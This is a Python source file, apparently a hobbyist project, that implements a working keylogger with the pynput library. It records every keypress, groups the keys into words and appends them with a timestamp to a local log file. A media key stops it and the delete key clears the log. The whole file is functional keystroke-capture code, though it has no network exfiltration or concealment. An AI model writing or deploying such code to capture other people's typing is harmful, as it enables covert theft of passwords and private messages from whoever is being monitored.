# Import
from pynput import keyboard as k
import datetime

ll = ""
# "ll" will contain the letters typed until the "space" or "enter" key is pressed
poss_words = []
# List of possible words/text that were typed (Including errors that may not have been deleted by "backspace")

class Keylogger:
    num = 0
    def __init__(self):
        self.ll = ''
        self.poss_words = []
        print("Running...")

    def __call__(self, key):
        if key == k.Key.media_next:  # Using the "media-next" button will stop the program
            if self.ll == '':
                # Program will take this route if the var "ll" is an empty string when the shutoff happens
                g = ""
                with open("Keylogger/log.txt", "a+") as log:
                    date = datetime.datetime.now()
                    dates = date.strftime("%b/%d/%Y")
                    time = date.strftime("%I:%M%p")
                    for i in self.poss_words:
                        g += f"{i} "
                    log.write(f"Text Log on {dates} at {time}: {g}\n")
                print("Logged and exited successfully!")  # Signs out after logging into log.txt
                exit()
            else:
                # Else the program will add whatever word it has left into the list before logging as to not miss one
                self.poss_words.append(self.ll)
                self.num += 1
                g = ''
                date = datetime.datetime.now()
                dates = date.strftime("%b/%d/%Y")
                time = date.strftime("%I:%M%p")
                with open("Keylogger/log.txt", "a+") as log:
                    for i in self.poss_words:
                        g += f"{i} "
                    log.write(f"Text Log on {dates} at {time}: {g}\n")
                    print("Logged and exited successfully!")  # Signs out after logging into log.txt
                exit()
        elif hasattr(key, 'char'):
            self.ll += key.char
        elif key in (k.Key.space, k.Key.enter):
            # If the found key is a "space" or the "enter" key, the program adds the word type to the "poss_words" list
            self.poss_words.append(self.ll)
            self.ll = ''
        elif key == k.Key.backspace:
            self.ll = self.ll[:-1]
        elif key == k.Key.delete:
            with open("Keylogger/log.txt", "w") as l:
                l.write("")
            print("Log Successfully Cleared")


with k.Listener(on_press=Keylogger()) as listener:
    listener.join()
